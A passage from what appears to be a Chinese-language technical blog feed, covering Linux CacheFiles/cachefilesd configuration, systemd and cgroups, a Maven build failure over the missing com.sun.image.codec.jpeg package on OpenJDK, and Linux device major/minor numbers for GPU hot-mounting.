to this state if the cache decides it wants to withdraw the object from service, perhaps to make space, but also due to error or just because the whole cache is being withdrawn.</span><br><span class="line"></span><br><span class="line">14. State FSCACHE_OBJECT_DEAD.</span><br><span class="line"></span><br><span class="line">The object transits to this state when the in-memory object record is ready to be deleted. The object processor shouldn’t ever see an object in this state.</span><br></pre></td></tr></table></figure>

<h2 id="CacheFiles介绍"><a href="#CacheFiles介绍" class="headerlink" title="CacheFiles介绍"></a>CacheFiles介绍</h2><p>CacheFiles,是属于Linux Kernel的一个模块，主要用于缓存已经挂载的文件系统，CacheFiles 是一个缓存后端，当一个文件系统挂载到本地时，可以基于CacheFiles做一个缓存目录，CacheFi 使用一个用户空间的守护进程进行cache管理，例如收割陈旧的节点和剔除，这个守护进程被称为cachefilesd</p>
<p>缓存的文件系统和数据完整性与后端服务的文件系统一样好，由于不同文件系统的日志记录接口都是特殊定义的，因此CacheFiles不会尝试记录任文件系统日志</p>
<p>CacheFiles 会创建一个混杂的字符设备”/dev/cachefiles”,用于与守护进程进行通信，这个设备一次打开只能做一次事情，当它打开时，至少存在部分缓存，守护进程打开 并发送指令用于控制缓存，CacheFiles目前只能用于一个单独的缓存</p>
<p>CacheFiles会尝试维护文件系统一定比例的空闲空间，可能会通过剔除部分cache用户缩小cache的大小，用于释放空间，这就意味着可以在同一介质上存放灵活的实时数据，可能会扩展来使用空闲的空间，也可能收缩</p>
<h2 id="Requiremenets"><a href="#Requiremenets" class="headerlink" title="Requiremenets"></a>Requiremenets</h2><p>使用CacheFiles 需要以下依赖</p>
<ul>
<li>dnotify: 对文件信号进行监听</li>
<li>extended attribute（xattrs）</li>
<li>openat() and friends</li>
<li>bmap() support on files in the filesystem (FIBMAP ioctl)</li>
<li>the use of bmap() to detect a partial page at the end of the file</li>
</ul>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置文件 /etc/cachefilesd.conf,配置文件的主要内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brun &lt;N&gt;%, bcull &lt;N&gt;%, bstop &lt;N&gt;%, frun &lt;N&gt;%, fcull &lt;N&gt;%, fstop &lt;N&gt;%</span><br><span class="line">Configure the culling limits. Optional. See the section on culling The defaults are 7% (run), 5% (cull) and 1% (stop) respectively.</span><br><span class="line"></span><br><span class="line">The commands beginning with a ‘b’ are file space (block) limits, those beginning with an ‘f’ are file count limits(也可以限制文件数量).</span><br><span class="line"></span><br><span class="line">dir &lt;path&gt; 存放缓存的根目录</span><br><span class="line">Specify the directory containing the root of the cache. Mandatory.</span><br><span class="line">tag &lt;name&gt; </span><br><span class="line">Specify a tag to FS-Cache to use in distinguishing multiple caches. Optional. The default is “CacheFiles”.</span><br><span class="line">debug &lt;mask&gt;  用于开启日志</span><br><span class="line">Specify a numeric bitmask to control debugging in the kernel module. Optional. The default is zero (all off). The following values can be OR’d into the mask to collect various information:</span><br><span class="line"></span><br><span class="line">1	Turn on trace of function entry (_enter() macros)</span><br><span class="line">2	Turn on trace of function exit (_leave() macros)</span><br><span class="line">4	Turn on trace of internal debug points (_debug())</span><br><span class="line">This mask can also be set through sysfs, eg:</span><br><span class="line"></span><br><span class="line">echo 5 &gt;&#x2F;sys&#x2F;modules&#x2F;cachefiles&#x2F;parameters&#x2F;debug</span><br></pre></td></tr></table></figure>

<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>启动守护进程，该守护进程打开 cache 设备（/dev/cachefiles）,配置cache，并开始进行cache，此时cache绑定fscache，cache开始运行。具体的启动命令和参数如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The daemon is run as follows:</span><br><span class="line"></span><br><span class="line">&#x2F;sbin&#x2F;cachefilesd [-d]* [-s] [-n] [-f &lt;configfile&gt;]</span><br><span class="line">The flags are:</span><br><span class="line"></span><br><span class="line">-d</span><br><span class="line">Increase the debugging level. This can be specified multiple times and is cumulative with itself.</span><br><span class="line">-s</span><br><span class="line">Send messages to stderr instead of syslog.</span><br><span class="line">-n</span><br><span class="line">Don’t daemonise and go into background.</span><br><span class="line">-f &lt;configfile&gt;</span><br><span class="line">Use an alternative configuration file rather than the default one.</span><br></pre></td></tr></table></figure>

<h2 id="缓存剔除"><a href="#缓存剔除" class="headerlink" title="缓存剔除"></a>缓存剔除</h2><p>缓存偶尔需要进行清理，用于释放空间，这里主要将近期未被使用的cache进行清理，基于文件的访问时间进行判断，如果空目录没有在使用也会被清理。Cache的清理是基于配置的当前文件系统的block比例和文件比例，主要有6个限制，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brun, frun</span><br><span class="line">If the amount of free space and the number of available files in the cache rises above both these limits, then culling is turned off.当缓存中空闲的block和file 都高于该值时，不进行缓存剔除</span><br><span class="line">bcull, fcull</span><br><span class="line">If the amount of available space or the number of available files in the cache falls below either of these limits, then culling is started.当缓存中可以使用的block或者files 有一个低于该值时，进行缓存剔除</span><br><span class="line">bstop, fstop</span><br><span class="line">If the amount of available space or the number of available files in the cache falls below either of these limits, then no further allocation of disk space or files is permitted until culling has raised things above these limits again.当缓存中可以使用的block或者files有一个低于该值时，除非缓存剔除机制进行了缓存剔除，否则不会再分配磁盘空间，</span><br></pre></td></tr></table></figure>
<p>通常配置是这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 &lt;&#x3D; bstop &lt; bcull &lt; brun &lt; 100</span><br><span class="line">0 &lt;&#x3D; fstop &lt; fcull &lt; frun &lt; 100</span><br></pre></td></tr></table></figure>

<p>需要注意，这些值是表示的可以使用的空间和文件，并不是100 减去使用df 查看的信息，用户空间的守护进程扫描cache，来建立一个需要提出的对象表，基于最少使用原则进行剔除。“ A new scan of the cache is started as soon as space is made in the table”，如果对象的atimes(最后访问时间)发生了变化，不会进行剔除，或者内核模块通知说该文件仍然在使用，也不会删除该cache</p>
<h2 id="缓存结构"><a href="#缓存结构" class="headerlink" title="缓存结构"></a>缓存结构</h2><p>会存在两个目录 </p>
<ul>
<li>cache/</li>
<li>graveyard/</li>
</ul>
<p>活动的cache 对象会存放在 cache/ 目录。CacheFile的内核模块会将不再使用或者剔除的对象移动到graveyard 目录，守护进程会在graveyard进行删除，守护进程使用dnotify来监控graveyard目录，然后会将graveyard存在的对象删除。</p>
<ul>
<li><p>CacheFiles 模块将索引对象使用目录的方式进行表示，目录名称可能是”I….”或者”J….”</p>
</li>
<li><p>没有子对象的数据对象会以文件的方式进行表示，有子对象的数据对象会以目录的形式进行表示，文件名称可能是”D…”或者”E….”。如果表示目录，那么会有一个叫”data”的文件在该目录，用户真实的保存数据</p>
</li>
</ul>
<ul>
<li>特殊的对象，通数据对象类似，不过文件名是以”S….”或者”T…”的形式</li>
</ul>
<p>如果一个对象有子对象，那么他会以目录的形式表示，在该目录下会有一系列子目录，子目录的名称以@+子对象的哈希值命名，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#x2F;INDEX    &#x2F;INDEX     &#x2F;INDEX                            &#x2F;DATA FILES</span><br><span class="line">&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">cache&#x2F;@4a&#x2F;I03nfs&#x2F;@30&#x2F;Ji000000000000000--fHg8hi8400</span><br><span class="line">cache&#x2F;@4a&#x2F;I03nfs&#x2F;@30&#x2F;Ji000000000000000--fHg8hi8400&#x2F;@75&#x2F;Es0g000w...DB1ry</span><br><span class="line">cache&#x2F;@4a&#x2F;I03nfs&#x2F;@30&#x2F;Ji000000000000000--fHg8hi8400&#x2F;@75&#x2F;Es0g000w...N22ry</span><br><span class="line">cache&#x2F;@4a&#x2F;I03nfs&#x2F;@30&#x2F;Ji000000000000000--fHg8hi8400&#x2F;@75&#x2F;Es0g000w...FP1ry</span><br></pre></td></tr></table></figure>

<p>如果文件名称太长，超过了NAME_MAX的大小，那么会被分成多分，第一份被用于创建嵌套目录，最后一份会位于最后一个目录，每个中间目录的名称会以”+”作为前缀，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">J1223&#x2F;@23&#x2F;+xy...z&#x2F;+kl...m&#x2F;Epqr</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Note that keys are raw data, and not only may they exceed NAME_MAX in size, they may also contain things like ‘&#x2F;’ and NUL characters, and so they may not be suitable for turning directly into a filename.</span><br><span class="line"></span><br><span class="line">To handle this, CacheFiles will use a suitably printable filename directly and “base-64” encode ones that aren’t directly suitable. The two versions of object filenames indicate the encoding:</span><br><span class="line"></span><br><span class="line">OBJECT TYPE	PRINTABLE	ENCODED</span><br><span class="line">Index	“I…”	“J…”</span><br><span class="line">Data	“D…”	“E…”</span><br><span class="line">Special	“S…”	“T…”</span><br><span class="line">Intermediate directories are always “@” or “+” as appropriate.</span><br><span class="line"></span><br><span class="line">Each object in the cache has an extended attribute label that holds the object type ID (required to distinguish special objects) and the auxiliary data from the netfs. The latter is used to detect stale objects in the cache and update or retire them.</span><br><span class="line"></span><br><span class="line">Note that CacheFiles will erase from the cache any file it doesn’t recognise or any file of an incorrect type (such as a FIFO file or a device file).</span><br></pre></td></tr></table></figure>

<h2 id="转载的阅读摘要"><a href="#转载的阅读摘要" class="headerlink" title="转载的阅读摘要"></a>转载的阅读摘要</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install cachefilesd; </span><br><span class="line"></span><br><span class="line">挂载命令：直接mount服务端共享的目录到本地的&#x2F;mnt目录，必须使用-o fsc参数选项;</span><br><span class="line"></span><br><span class="line">All access to files under &#x2F;mount&#x2F;point will go through the cache, unless the file is opened for direct I&#x2F;O or writing; </span><br><span class="line"></span><br><span class="line">Opening a file from a shared file system for direct I&#x2F;O automatically bypasses the cache. This is because this type of access must be direct to the server.</span><br><span class="line"></span><br><span class="line">To avoid coherency management problems between superblocks, all NFS superblocks that wish to cache data have unique Level 2 keys. Normally, two NFS mounts with same source volume and options share a superblock, and thus share the caching, even if they mount different directories within that volume.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Opening a file from a shared file system for writing will not work on NFS version 2 and 3.  因为没有足够的维持并发写的一致性信息；</span><br><span class="line"></span><br><span class="line">Furthermore, this release of FS-Cache only caches regular NFS files. FS-Cache will not cache directories, symlinks, device files, FIFOs and sockets. 其只对文件数据进行cache的操作。</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>cgroup相关知识</title>
    <url>/2023/01/05/cgroup%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="Systemd-依赖-cgroups"><a href="#Systemd-依赖-cgroups" class="headerlink" title="Systemd 依赖 cgroups"></a>Systemd 依赖 cgroups</h2><p>要理解 systemd 与 cgroups 的关系，我们需要先区分 cgroups 的两个方面：层级结构(A)和资源控制(B)。首先 cgroups 是以层级结构组织并标识进程的一种方式，同时它也是在该层级结构上执行资源限制的一种方式。我们简单的把 cgroups 的层级结构称为 A，把 cgrpups 的资源控制能力称为 B。<br>对于 systemd 来说，A 是必须的，如果没有 A，systemd 将不能很好的工作。而 B 则是可选的，如果你不需要对资源进行控制，那么在编译 Linux 内核时完全可以去掉 B 相关的编译选项。</p>
<h2 id="Systemd-默认挂载的-cgroups-系统"><a href="#Systemd-默认挂载的-cgroups-系统" class="headerlink" title="Systemd 默认挂载的 cgroups 系统"></a>Systemd 默认挂载的 cgroups 系统</h2><p>在系统的开机阶段，systemd 会把支持的 controllers (subsystem 子系统)挂载到默认的 /sys/fs/cgroup/ 目录下面：<br><img src="/2023/01/05/cgroup%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/1.png" alt="avatar"></p>
<p>除了 systemd 目录外，其它目录都是对应的 subsystem。<br>/sys/fs/cgroup/systemd 目录是 systemd 维护的自己使用的非 subsystem 的 cgroups 层级结构。这玩意儿是 systemd 自己使用的，换句话说就是，并不允许其它的程序动这个目录下的内容。其实 /sys/fs/cgroup/systemd 目录对应的 cgroups 层级结构就是 systemd 用来使用 cgoups 中 feature A 的。<br><img src="/2023/01/05/cgroup%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/2.png" alt="avatar"></p>
<h2 id="Cgroup-的默认层级"><a href="#Cgroup-的默认层级" class="headerlink" title="Cgroup 的默认层级"></a>Cgroup 的默认层级</h2><p>通过将 cgroup 层级系统与 systemd unit 树绑定，systemd 可以把资源管理的设置从进程级别移至应用程序级别。因此，我们可以使用 systemctl 指令，或者通过修改 systemd unit 的配置文件来管理 unit 相关的资源。默认情况下，systemd 会自动创建 slice、scope 和 service unit 的层级.</p>
<ol>
<li>service： 一个或一组进程，由 systemd 依据 unit 配置文件启动。service 对指定进程进行封装，这样进程可以作为一个整体被启动或终止。</li>
<li>scope：一组外部创建的进程。由进程通过 fork() 函数启动和终止、之后被 systemd 在运行时注册的进程，scope 会将其封装。例如：用户会话、 容器和虚拟机被认为是 scope。</li>
<li>slice： 一组按层级排列的 unit。slice 并不包含进程，但会组建一个层级，并将 scope 和 service 都放置其中。真正的进程包含在 scope 或 service 中。在这一被划分层级的树中，每一个 slice 单位的名字对应通向层级中一个位置的路径。<br>我们可以通过 systemd-cgls 命令来查看 cgroups 的层级结构：<br><img src="/2023/01/05/cgroup%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/3.png" alt="avatar"></li>
</ol>
<p>默认情况下，系统会创建四种 slice：</p>
<ol>
<li>-.slice：根 slice</li>
<li>system.slice：所有系统 service 的默认位置</li>
<li>user.slice：所有用户会话的默认位置</li>
<li>machine.slice：所有虚拟机和 Linux 容器的默认位置</li>
</ol>
<h2 id="通过配置文件修改-cgroup"><a href="#通过配置文件修改-cgroup" class="headerlink" title="通过配置文件修改 cgroup"></a>通过配置文件修改 cgroup</h2><p>所有被 systemd 监管的 persistent cgroup(持久的 cgroup)都在 /usr/lib/systemd/system/ 目录中有一个 unit 配置文件。比如我们常见的 service 类型 unit 的配置文件。我们可以通过设置 unit 配置文件来控制应用程序的资源，persistent cgroup 的特点是即便系统重启，相关配置也会被保留。需要注意的是，scope unit 不能以此方式创建。下面让我们为 cron.service 添加 CPU 和内存相关的一些限制，编辑 /lib/systemd/system/cron.service 文件：<br><img src="/2023/01/05/cgroup%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/4.png" alt="avatar"></p>
<p>现在去查看 /sys/fs/cgroup/memory/system.slice/cron.service/memory.limit_in_bytes 和 /sys/fs/cgroup/cpu/system.slice/cron.service/cpu.shares 文件</p>
<h2 id="Systemd-cgtop-命令"><a href="#Systemd-cgtop-命令" class="headerlink" title="Systemd-cgtop 命令"></a>Systemd-cgtop 命令</h2><p>类似于 top 命令，systemd-cgtop 命令显示 cgoups 的实时资源消耗情况：<br><img src="/2023/01/05/cgroup%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/5.png" alt="avatar"></p>
]]></content>
  </entry>
  <entry>
    <title>com.sun.image.codec.jpeg does not exist</title>
    <url>/2020/09/21/com-sun-image-codec-jpeg-does-not-exist/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>一个项目在windows下执行mvn package正常，但是放在Linux环境下，会出现找不到com.sun.image.codec的问题，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ERROR] COMPILATION ERROR : </span><br><span class="line">[INFO] -------------------------------------------------------------</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController2.java:[24,40] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController2.java:[25,40] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController.java:[25,32] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController.java:[26,32] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[INFO] 4 errors </span><br><span class="line">[INFO] -------------------------------------------------------------</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Reactor Summary:</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] ztzx 1.0.0 ......................................... SUCCESS [  0.007 s]</span><br><span class="line">[INFO] ztzx.service ....................................... FAILURE [02:11 min]</span><br><span class="line">[INFO] ztzx.web 1.0.0 ..................................... SKIPPED</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD FAILURE</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: 02:11 min</span><br><span class="line">[INFO] Finished at: 2018-08-06T01:51:45Z</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:compile (default-compile) on project ztzx.service: Compilation failure: Compilation failure: </span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController2.java:[24,40] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController2.java:[25,40] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController.java:[25,32] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] &#x2F;home&#x2F;ztzx&#x2F;ztzx.service&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;telchina&#x2F;ztzx&#x2F;common&#x2F;controller&#x2F;UploadController.java:[26,32] package com.sun.image.codec.jpeg does not exist</span><br><span class="line">[ERROR] -&gt; [Help 1]</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.</span><br><span class="line">[ERROR] Re-run Maven using the -X switch to enable full debug logging.</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] For more information about the errors and possible solutions, please read the following articles:</span><br><span class="line">[ERROR] [Help 1] http:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;MAVEN&#x2F;MojoFailureException</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] After correcting the problems, you can resume the build with the command</span><br><span class="line">[ERROR]   mvn &lt;goals&gt; -rf :ztzx.service</span><br></pre></td></tr></table></figure>

<h3 id="分析一"><a href="#分析一" class="headerlink" title="分析一"></a>分析一</h3><p>按照Java官方的解释,sun.image.codec这个package已经被deprecated，建议不要使用，看官方的解释： Why Developers Should Not Write Programs That Call ‘sun’ Packages The java.*, javax.* and org.* packages documented in the Java Platform Standard Edition API Specification make up the official, supported, public interface. If a Java program directly calls only API in these packages, it will operate on all Java-compatible platforms, regardless of the underlying OS platform. The sun.* packages are not part of the supported, public interface. A Java program that directly calls into sun.* packages is not guaranteed to work on all Java-compatible platforms. In fact, such a program is not guaranteed to work even in future versions on the same platform. Each company that implements the Java platform will do so in their own private way. The classes in sun.* are present in the JDK to support Oracle’s implementation of the Java platform: the sun.* classes are what make the Java platform classes work “under the covers” for Oracle’s JDK. These classes will not in general be present on another vendor’s Java platform. If your Java program asks for a class “sun.package.Foo” by name, it may fail with ClassNotFoundError, and you will have lost a major advantage of developing in Java. Technically, nothing prevents your program from calling into sun.* by name. From one release to another, these classes may be removed, or they may be moved from one package to another, and it’s fairly likely that their interface (method names and signatures) will change. (From Oracle’s point of view, since we are committed to maintaining the Java platform, we need to be able to change sun.* to refine and enhance the platform.) In this case, even if you are willing to run only on Oracle’s implementation, you run the risk of a new version of the implementation breaking your program. In general, writing java programs that rely on sun.* is risky: those classes are not portable, and are not supported<br>可以这样理解，Java已经被Oracle收购多年，里面再去出现sun的package算怎么回事。。O(∩_∩)O哈哈~，当然你还是可以去使用的，可以在pom.xml 经配置了下面的参数，排除无法引入jar包的问题，这个方法并不能解决我在Linux无法进行构建的的问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">                   &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;</span><br><span class="line">                   &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">                   &lt;version&gt;3.1&lt;&#x2F;version&gt;</span><br><span class="line">                   &lt;configuration&gt;</span><br><span class="line">                       &lt;source&gt;$&#123;jdkVersion&#125;&lt;&#x2F;source&gt;</span><br><span class="line">                       &lt;target&gt;$&#123;jdkVersion&#125;&lt;&#x2F;target&gt;</span><br><span class="line">                       &lt;compilerArguments&gt;</span><br><span class="line">                           &lt;verbose &#x2F;&gt;</span><br><span class="line">                           &lt;bootclasspath&gt;$&#123;JAVA_HOME&#125;&#x2F;jre&#x2F;lib&#x2F;rt.jar$&#123;path.separator&#125;$&#123;JAVA_HOME&#125;&#x2F;jre&#x2F;lib&#x2F;jce.jar&lt;&#x2F;bootclasspath&gt;</span><br><span class="line">                       &lt;&#x2F;compilerArguments&gt;</span><br><span class="line">                   &lt;&#x2F;configuration&gt;</span><br><span class="line">               &lt;&#x2F;plugin&gt;</span><br></pre></td></tr></table></figure>

<h3 id="分析二"><a href="#分析二" class="headerlink" title="分析二"></a>分析二</h3><p>查看mvn仓库信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@30e8e1cd5962:&#x2F;home&#x2F;ztzx# mvn -version</span><br><span class="line">Apache Maven 3.5.3 (3383c37e1f9e9b3bc3df5050c29c8aff9f295297; 2018-02-24T19:49:05Z)</span><br><span class="line">Maven home: &#x2F;usr&#x2F;share&#x2F;maven</span><br><span class="line">Java version: 1.8.0_91, vendor: Oracle Corporation</span><br><span class="line">Java home: &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-8-openjdk-amd64&#x2F;jre</span><br><span class="line">Default locale: en, platform encoding: UTF-8</span><br><span class="line">OS name: &quot;linux&quot;, version: &quot;3.10.0-693.el7.x86_64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot; </span><br><span class="line">&#96;&#96;&#96;查看Java 信息</span><br></pre></td></tr></table></figure>
<p>root@30e8e1cd5962:/home/ztzx# java -version<br>openjdk version “1.8.0_91”<br>OpenJDK Runtime Environment (build 1.8.0_91-8u91-b14-1~bpo8+1-b14)<br>OpenJDK 64-Bit Server VM (build 25.91-b14, mixed mode) </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">与windows的运行环境相比，出Java的小版本不同外，还有一个区别，就是Oracle Java与OpenJdk的区别，google资料，发现OpenJdk已经在1.7版本移除了该package。[OpenJdk移除jepg的package](http:&#x2F;&#x2F;jira.icesoft.org&#x2F;browse&#x2F;PDF-332?jql&#x3D;project%20%3D%20PDF%20AND%20fixVersion%20%3D%205.1%20ORDER%20BY%20updated%20DESC%2C%20priority%20DESC%2C%20created%20ASC)，将Linux 默认的OpenJdk替换为Oracle的Jdk，即可以解决问题</span><br><span class="line"></span><br><span class="line">### 其他解决方法</span><br><span class="line"></span><br><span class="line">JPEGImageEncoder类是SUN公司私有类</span><br></pre></td></tr></table></figure>
<p>一般出现在这样的代码段中：<br>    FileOutputStream out = new FileOutputStream(dstName);<br>     JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out);<br>     encoder.encode(dstImage);</p>
<p>改写成：</p>
<pre><code>String formatName = dstName.substring(dstName.lastIndexOf(&quot;.&quot;) + 1);
 //FileOutputStream out = new FileOutputStream(dstName);
 //JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out);
 //encoder.encode(dstImage);
 ImageIO.write(dstImage, /*&quot;GIF&quot;*/ formatName /* format desired */ , new File(dstName) /* target */ ); </code></pre>
<p>```<br>都使用统一的ImageIO进行图像格式文件的读写，没有必要使用过时的实现类JPEGImageEncoder类。</p>
]]></content>
  </entry>
  <entry>
    <title>gpu 热挂载项目分析</title>
    <url>/2021/01/18/gpu-%E7%83%AD%E6%8C%82%E8%BD%BD%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>测试场景 NVIDIA-Driver 418.67<br>nvidia-docker 版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root~]# rpm -qa|grep nvidia</span><br><span class="line">nvidia_peer_memory-1.0-8.x86_64</span><br><span class="line">libnvidia-container1-1.3.1-1.x86_64</span><br><span class="line">nvidia-docker2-2.5.0-1.noarch</span><br><span class="line">libnvidia-container-tools-1.3.1-1.x86_64</span><br><span class="line">nvidia-container-runtime-3.4.0-1.x86_64</span><br><span class="line">nvidia-container-toolkit-1.4.0-2.x86_64</span><br></pre></td></tr></table></figure>
<h2 id="Linux-设备的major-和minor-number"><a href="#Linux-设备的major-和minor-number" class="headerlink" title="Linux 设备的major 和minor number"></a>Linux 设备的major 和minor number</h2><p>Linux 系统的/dev 目录下面的设备文件是用来描述外设的，如/dev/sda1表示第一块硬盘的第一个分区，但是这个/dev/sda1紧紧是方便用户观察，Linux内核中表示不同的设备是通过major和minor number 实现，对多major和minor number 来加载相应的驱动程序。其中<br>major number：表示不同的设备类型</p>
<p>minor number ：表示同一个设备的不同分区</p>
<p>主设备号标识设备对应的驱动程序（或者多个相关的驱动程序共用相同的一个主设备号），次设备号表示驱动程序驱动的一个设备。</p>
<p>例如Linux系统中的sda磁盘和sdb 磁盘major number 都是8，但是sda的minor number 是从0 开始，sdb的minor number 是16开始<br>使用以下命令查看major number 和minor number</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@node devices]# ls -l /dev/sda1</span><br><span class="line">brw-rw---- 1 root disk 8, 1 1月  29 16:55 /dev/sda1</span><br></pre></td></tr></table></figure>
<p>上述命令中，brw的b表示块设备(block),主设备号是8,次设备号是1。也就是8,1表示major,minor。也可以stat –format=%t:%T显示</p>
<p>查看GPU的信息major和minor 信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@node ~]# ls -l /dev/nvidia0 </span><br><span class="line">crw-rw-rw- 1 root root 195, 0 Jan 18 16:48 /dev/nvidia0</span><br><span class="line">[root@node ~]# ls -l /dev/nvidia1</span><br><span class="line">crw-rw-rw- 1 root root 195, 1 Jan 18 16:48 /dev/nvidia1</span><br></pre></td></tr></table></figure>
<p>也可以通过代码获取major number 和minor numer ，这里找到一段代码用于获取</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDiskMajorMinor</span><span class="params">(path <span class="keyword">string</span>)</span> <span class="params">(major, minor <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">	stat := syscall.Stat_t&#123;&#125;</span><br><span class="line">	err = syscall.Stat(path, &amp;stat)</span><br><span class="line">	<span class="keyword">if</span> <span class="literal">nil</span> != err &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//refer to "dev_t new_decode_dev(u32 dev)" defined in the kernel header file linux/kdev.h</span></span><br><span class="line">	major = <span class="keyword">int</span>(((<span class="keyword">uint32</span>(stat.Dev)) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xfff</span>)</span><br><span class="line">	minor = <span class="keyword">int</span>((stat.Dev &amp; <span class="number">0xff</span>) | ((stat.Dev &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xfff00</span>))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> major, minor, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

